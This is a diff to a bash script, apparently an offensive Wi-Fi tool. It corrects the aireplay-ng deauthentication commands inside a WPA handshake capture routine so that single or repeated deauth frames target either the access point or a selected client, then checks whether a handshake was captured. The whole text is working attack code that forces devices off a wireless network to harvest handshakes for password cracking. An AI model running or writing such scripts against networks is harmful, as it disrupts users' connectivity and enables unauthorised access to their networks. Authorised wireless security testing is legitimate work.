@@ -582,11 +582,12 @@ listen_for_wpa_handshake() {
         if [ "$selected_mac" == "$BSSID" ]; then
             echo ""
             echo -e "Sent a single deauthentication frame to ${GREEN}$TARGET_SSID ($BSSID)${NC}"
+            aireplay-ng --deauth 1 -a "$BSSID" "$MON_INTERFACE" &> /dev/null
         else
             echo ""
             echo -e "Sent a single deauthentication frame to ${ORANGE}client ($selected_mac)${NC}"
+            aireplay-ng --deauth 1 -a "$BSSID" -c "$selected_mac" "$MON_INTERFACE" &> /dev/null
         fi
-        aireplay-ng --deauth 1 -a "$selected_mac" "$MON_INTERFACE" &> /dev/null
 
         # Check for handshake
         sleep 30
@@ -596,14 +597,16 @@ listen_for_wpa_handshake() {
             handshake_captured=true
         else
             echo -e "${BOLD_RED}Handshake not captured.${NC}"
+
             # Perform deauthentication (x5) based on user choice
             if [ "$selected_mac" == "$BSSID" ]; then
                 echo ""
                 echo -e "Sending 5 deauthentication frames to ${GREEN}$TARGET_SSID ($BSSID)${NC}"
+                aireplay-ng --deauth 5 -a "$BSSID" "$MON_INTERFACE" &> /dev/null
             else
                 echo ""
                 echo -e "Sending 5 deauthentication frames to ${ORANGE}client ($selected_mac)${NC}"
-                aireplay-ng --deauth 5 -a "$BSSID" "$MON_INTERFACE" &> /dev/null
+                aireplay-ng --deauth 5 -a "$BSSID" -c "$selected_mac" "$MON_INTERFACE" &> /dev/null
             fi
                 sleep 30
                 # Notify user that WPA handshake has been successfully captured, or loop back to target selection if it has not
